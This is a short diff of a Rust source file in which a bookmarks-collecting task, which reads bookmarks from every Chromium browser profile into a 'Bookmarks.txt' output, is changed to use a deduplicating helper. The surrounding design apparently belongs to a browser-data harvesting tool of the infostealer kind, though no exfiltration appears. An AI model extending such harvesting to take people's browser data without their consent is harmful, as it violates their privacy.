@@ -1,6 +1,6 @@
 use crate::alloc::borrow::ToOwned;
 use crate::chromium::BrowserData;
-use crate::{collect_from_all_profiles, to_string_and_write_all, Bookmark};
+use crate::{collect_unique_from_profiles, to_string_and_write_all, Bookmark};
 use alloc::sync::Arc;
 use alloc::vec;
 use alloc::vec::Vec;
@@ -26,7 +26,7 @@ impl<C: Collector, F: FileSystem> Task<C, F> for BookmarksTask {
     parent_name!("Bookmarks.txt");
 
     fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
-        let Some(bookmarks) = collect_from_all_profiles(&self.browser.profiles, |profile| {
+        let Some(bookmarks) = collect_unique_from_profiles(&self.browser.profiles, |profile| {
             read_bookmarks(&StorageFileSystem, profile)
         }) else {
             return;
